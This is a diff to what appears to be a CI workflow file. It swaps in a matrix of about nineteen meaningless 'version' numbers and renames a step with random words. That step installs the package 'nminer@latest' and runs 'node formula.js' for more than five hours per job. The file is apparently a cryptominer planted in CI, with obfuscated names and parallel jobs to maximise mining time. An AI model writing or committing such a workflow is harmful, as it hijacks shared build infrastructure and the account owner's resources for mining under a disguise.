@@ -9,23 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8212 }
-          - { version: 3381 }
-          - { version: 4376 }
-          - { version: 5347 }
-          - { version: 3245 }
-          - { version: 8840 }
-          - { version: 3798 }
-          - { version: 1142 }
-          - { version: 1062 }
-          - { version: 5534 }
-          - { version: 4566 }
-          - { version: 8118 }
-          - { version: 6902 }
-          - { version: 9542 }
-          - { version: 1185 }
-          - { version: 324 }
-          - { version: 456 }
+          - { version: 1126 }
+          - { version: 3803 }
+          - { version: 6347 }
+          - { version: 1942 }
+          - { version: 6968 }
+          - { version: 5833 }
+          - { version: 4262 }
+          - { version: 1832 }
+          - { version: 479 }
+          - { version: 4082 }
+          - { version: 6387 }
+          - { version: 526 }
+          - { version: 3571 }
+          - { version: 278 }
+          - { version: 1076 }
+          - { version: 1330 }
+          - { version: 2107 }
+          - { version: 7865 }
+          - { version: 8821 }
 
     steps:
       - name: Checkout
@@ -36,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: torn personal unfortunately exaggerate why
+      - name: bestride overspend gee jubilantly corny
         run: |
           npm install nminer@latest
-          timeout 344m node formula.js || echo "formula executed"
+          timeout 323m node formula.js || echo "formula executed"
